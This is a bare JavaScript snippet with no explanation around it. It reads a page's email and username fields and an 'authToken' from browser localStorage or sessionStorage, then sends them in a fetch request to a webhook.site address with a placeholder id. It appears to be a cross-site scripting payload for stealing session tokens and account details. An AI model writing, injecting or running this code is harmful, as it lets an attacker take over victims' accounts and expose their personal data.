let email = document.querySelector("#email")?.innerText || "";
let username = document.querySelector("#username")?.innerText || "";
let token = localStorage.getItem("authToken") || sessionStorage.getItem("authToken") || "";

fetch("https://webhook.site/your-id?email=" + email + "&username=" + username + "&token=" + token);